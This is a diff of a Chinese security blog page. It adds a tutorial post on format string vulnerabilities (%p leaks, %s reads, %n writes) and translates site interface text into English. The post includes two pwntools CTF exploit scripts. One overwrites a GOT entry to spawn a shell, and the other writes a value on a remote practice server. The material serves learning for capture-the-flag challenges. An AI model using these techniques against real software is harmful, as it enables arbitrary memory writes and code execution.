@@ -94,7 +94,7 @@
 			
 				<div class="m_search">
 					<form name="searchform" class="form u-search-form">
-						<input type="text" class="input u-search-input" placeholder="搜索">
+						<input type="text" class="input u-search-input" placeholder="Search">
 						<i class="icon fas fa-search fa-fw"></i>
 					</form>
 				</div>
@@ -176,9 +176,150 @@
         
           
         
+          
+        
       
     
     
+      
+        
+          <div class="post-wrapper">
+            <article class="post reveal ">
+  
+
+
+  <section class="meta">
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/2020/12/12/PWN-格式化字符串原理/">
+      PWN-格式化字符串原理
+    </a>
+  </h2>
+
+
+      
+      <div class="new-meta-box">
+        
+          
+        
+          
+            
+  <div class="new-meta-item author">
+    <a href="http://yoursite.com" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>John Doe</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class="notlink">
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2020-12-12</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      <h2 id="格式化字符串原理"><a href="#格式化字符串原理" class="headerlink" title="格式化字符串原理"></a>格式化字符串原理</h2><h3 id="1-format-string"><a href="#1-format-string" class="headerlink" title="1.format string"></a>1.format string</h3><ul>
+<li>print家族函数接受变长的字符串,其中第一个参数就是format string,后面的参数在实际运行中将与之对应</li>
+<li>format string符号说明<ul>
+<li>%P  将对应的参数解析为地址形式输出</li>
+<li>%K$P 对应格式化字符串后的第K个参数,并以地址形式输出</li>
+<li>%K$n 与格式化字符串后的第K个参数对应,将参数解析为一个地址,并取消此次输出,而将已经输出的字节长度写入获取的地址<ul>
+<li>预调用约定</li>
+<li>printf的参数按照参数的顺序依次存放在栈上的(32位)</li>
+<li>对于64位机,前六个参数存放在相应的寄存器中</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-格式化字符串漏洞"><a href="#2-格式化字符串漏洞" class="headerlink" title="2.格式化字符串漏洞"></a>2.格式化字符串漏洞</h3><h4 id="1-内存泄漏-p"><a href="#1-内存泄漏-p" class="headerlink" title="1.内存泄漏(%p)"></a>1.内存泄漏(%p)</h4><ul>
+<li>当format string中的符号个数超过参数的个数时,printf会根据调用约定到,栈上(reg)中取值</li>
+<li>因此当我们不向printf提供更多参数时,prinf会打印出栈上本不应该被访问的值</li>
+</ul>
+<h4 id="2-任意地址泄漏-7-s"><a href="#2-任意地址泄漏-7-s" class="headerlink" title="2.任意地址泄漏(%7$s)"></a>2.任意地址泄漏(%7$s)</h4><ul>
+<li>类似这样的构造会造成栈上第 7+1 个参数,所在的地址被解析,读取该地址指向的字符串</li>
+</ul>
+<h4 id="3-内存覆盖-k-n"><a href="#3-内存覆盖-k-n" class="headerlink" title="3. 内存覆盖(%k$n)"></a>3. 内存覆盖(%k$n)</h4><ul>
+<li>需要清楚的是把什么值输出到哪里去?<pre><code>- 首先,写入的是%之前的字节数
+</code></pre><ul>
+<li>其次写入的目的地是?<pre><code>- %n对当前偏移指向的那块空间存储的指针指向的空间写入数字,并取消此次输出
+- 因此,写入的地址为,用户输入的地址des(当然,需要加偏移)
+- 比如说你输入了一个地址,此时会有一个地址(tmp)储存你输入的地址(des),而format string 作为一个参数,在函数栈中是有地址的,而由于格式化符号大于输入参数的个数,因此函数栈中会有很多的地址存储,因此需要通过偏移量找到用户输入的地址(des),并向des指向的空间写入%之前的字节数
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>实现任意地址写入</p>
+<ul>
+<li><p>如何实现向任意地址写入任意字符串?</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-各种格式化字符含义"><a href="#4-各种格式化字符含义" class="headerlink" title="4.各种格式化字符含义"></a>4.各种格式化字符含义</h4><p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
+<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
+<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
+<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
+<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
+<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p>
+<h3 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h3><h4 id="1-向got表中写入system的plt地址"><a href="#1-向got表中写入system的plt地址" class="headerlink" title="1.向got表中写入system的plt地址"></a>1.向got表中写入system的plt地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn5'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这就是如何向任意地址空间写入任意数据</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="2-向某个空间写入具体数据"><a href="#2-向某个空间写入具体数据" class="headerlink" title="2.向某个空间写入具体数据"></a>2.向某个空间写入具体数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26486</span>)</span><br><span class="line"></span><br><span class="line">unk_804C044 = <span class="number">0x0804C044</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;unk_804C044:<span class="number">0x1111</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">"your name:"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"your passwd"</span>,str(<span class="number">0x1111</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+      <div class="full-width auto-padding tags">
+        
+          <a href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>PWN CTF</a>
+        
+      </div>
+    
+  </section>
+</article>
+
+          </div>
+        
       
         
           <div class="post-wrapper">
@@ -253,7 +394,7 @@
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <h2 id="三、缓冲区溢出原理"><a href="#三、缓冲区溢出原理" class="headerlink" title="三、缓冲区溢出原理"></a>三、缓冲区溢出原理</h2><h3 id="1-程序内存布局"><a href="#1-程序内存布局" class="headerlink" title="1.程序内存布局"></a>1.程序内存布局</h3><ul>
+      <h2 id="缓冲区溢出原理"><a href="#缓冲区溢出原理" class="headerlink" title="缓冲区溢出原理"></a>缓冲区溢出原理</h2><h3 id="1-程序内存布局"><a href="#1-程序内存布局" class="headerlink" title="1.程序内存布局"></a>1.程序内存布局</h3><ul>
 <li><p>在程序运行的生命周期中,内存中比较重要的四部分数据是程序数据、堆、库数据、栈.此外内核空间也会映射到程序的内存中.</p>
 <p><img src="/2020/12/12/PWN-缓冲区溢出原理/image-20201116110155289.png" alt=""></p>
 </li>
@@ -881,7 +1022,7 @@
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      <h2 id="三、堆相关的漏洞"><a href="#三、堆相关的漏洞" class="headerlink" title="三、堆相关的漏洞"></a>三、堆相关的漏洞</h2><h3 id="1-堆介绍"><a href="#1-堆介绍" class="headerlink" title="1.堆介绍"></a>1.堆介绍</h3><ul>
+      <h2 id="堆相关的漏洞"><a href="#堆相关的漏洞" class="headerlink" title="堆相关的漏洞"></a>堆相关的漏洞</h2><h3 id="1-堆介绍"><a href="#1-堆介绍" class="headerlink" title="1.堆介绍"></a>1.堆介绍</h3><ul>
 <li>结构示意图<ul>
 <li><img src="/2020/12/12/PWN-堆相关的漏洞/image-20201117102955545.png" alt="image-20201117102955545"></li>
 <li>N位：define NON_MAIN_ARENA 用于表示是否属于主线程，0表示主线程的堆块结构，1表示子线程的堆块结构</li>
@@ -1382,7 +1523,7 @@
   <section class="widget tagcloud">
     
 <header class="material">
-  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;热门标签</div>
+  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;Hot Tags</div>
   
     <a class="rightBtn" rel="nofollow" href="/tags" title="/tags">
     <i class="fas fa-expand-arrows-alt fa-fw"></i></a>
@@ -1390,7 +1531,7 @@
 </header>
 
     <div class="content material">
-      <a href="/tags/PWN-CTF/" style="font-size: 24px; color: #555">PWN CTF</a> <a href="/tags/c/" style="font-size: 14px; color: #999">c++</a> <a href="/tags/docker/" style="font-size: 14px; color: #999">docker</a> <a href="/tags/git/" style="font-size: 14px; color: #999">git</a> <a href="/tags/github/" style="font-size: 14px; color: #999">github</a> <a href="/tags/mysql/" style="font-size: 14px; color: #999">mysql</a> <a href="/tags/python/" style="font-size: 19px; color: #777">python</a> <a href="/tags/python-scrapy-爬虫/" style="font-size: 14px; color: #999">python scrapy 爬虫</a> <a href="/tags/ubuntu/" style="font-size: 14px; color: #999">ubuntu</a> <a href="/tags/数据分析/" style="font-size: 24px; color: #555">数据分析</a> <a href="/tags/网络编程-python/" style="font-size: 14px; color: #999">网络编程 python</a>
+      <a href="/tags/PWN-CTF/" style="font-size: 24px; color: #555">PWN CTF</a> <a href="/tags/c/" style="font-size: 14px; color: #999">c++</a> <a href="/tags/docker/" style="font-size: 14px; color: #999">docker</a> <a href="/tags/git/" style="font-size: 14px; color: #999">git</a> <a href="/tags/github/" style="font-size: 14px; color: #999">github</a> <a href="/tags/mysql/" style="font-size: 14px; color: #999">mysql</a> <a href="/tags/python/" style="font-size: 17.33px; color: #828282">python</a> <a href="/tags/python-scrapy-爬虫/" style="font-size: 14px; color: #999">python scrapy 爬虫</a> <a href="/tags/ubuntu/" style="font-size: 14px; color: #999">ubuntu</a> <a href="/tags/数据分析/" style="font-size: 20.67px; color: #6c6c6c">数据分析</a> <a href="/tags/网络编程-python/" style="font-size: 14px; color: #999">网络编程 python</a>
     </div>
   </section>
 
@@ -1463,19 +1604,19 @@
     </div>
   
   <br>
-  <div><p>博客内容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+  <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
   <div>
-    本站使用
+    Use
     <a href="https://xaoxuu.com/wiki/material-x/" target="_blank" class="codename">Material X</a>
-    作为主题
+    as theme
     
-      ，
-      总访问量为
+      , 
+      total visits
       <span id="busuanzi_value_site_pv"><i class="fas fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span>
-      次
+      times
     
-    。
+    . 
   </div>
 </footer>
 <script>setLoadingBarProgress(80);</script>
@@ -1581,15 +1722,15 @@
 <!-- 复制 -->
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 <script>
-  let COPY_SUCCESS = "复制成功";
-  let COPY_FAILURE = "复制失败";
+  let COPY_SUCCESS = "Copied";
+  let COPY_FAILURE = "Copy failed";
   /*页面载入完成后，创建复制按钮*/
   !function (e, t, a) {
     /* code */
     var initCopyCode = function(){
       var copyHtml = '';
       copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
-      copyHtml += '  <i class="fa fa-copy"></i><span>复制</span>';
+      copyHtml += '  <i class="fa fa-copy"></i><span>Copy</span>';
       copyHtml += '</button>';
       $(".highlight .code pre").before(copyHtml);
       var clipboard = new ClipboardJS('.btn-copy', {
